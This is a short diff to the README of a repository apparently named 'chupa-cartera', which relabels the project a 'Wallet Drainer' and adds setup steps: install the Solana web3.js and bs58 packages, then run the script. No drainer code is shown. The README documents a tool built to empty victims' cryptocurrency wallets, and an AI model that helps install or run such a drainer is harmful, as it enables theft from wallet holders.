@@ -1,3 +1,8 @@
 # chupa-cartera
 chupa cartera
-Drainer
+Wallet Drainer
+
+dependencies
+npm install @solana/web3.js bs58
+
+then run script
